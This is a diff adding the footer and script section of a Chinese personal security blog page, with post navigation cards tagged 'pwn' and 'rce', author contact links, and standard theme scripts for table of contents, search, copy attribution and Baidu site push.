+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            jcxj
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/jcxj/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/jcxj/2022/11/08/wen-jian-bao-han/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/jcxj/medias/featureimages/13.jpg" class="responsive-img" alt="文件包含">
+                        
+                        <span class="card-title">文件包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            jcxj
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/jcxj/tags/rce/">
+                        <span class="chip bg-color">rce</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Made by jcxj<br />'
+            + 'Author: jcxj<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归jcxj所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/jcxj/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/jcxj/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/jcxj/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/jcxj/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2022</span>
+            
+            <span id="year">2022</span>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">47.2k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2022";
+                    var startMonth = "09";
+                    var startDate = "20";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/jcxj/jcxj" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:971748776@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=971748776" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 971748776" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/jcxj/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/jcxj/libs/materialize/materialize.min.js"></script>
+    <script src="/jcxj/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/jcxj/libs/aos/aos.js"></script>
+    <script src="/jcxj/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/jcxj/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/jcxj/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/jcxj/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/jcxj/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
+<script type="text/javascript"> var OriginTitile = document.title, st;
+document.addEventListener("visibilitychange", function () { document.hidden ? (document.title = "问题没解决?", clearTimeout(st)) : (document.title = "Made by jcxj", st = setTimeout(function () { document.title = OriginTitile }, 3e3)) }) </script>
+
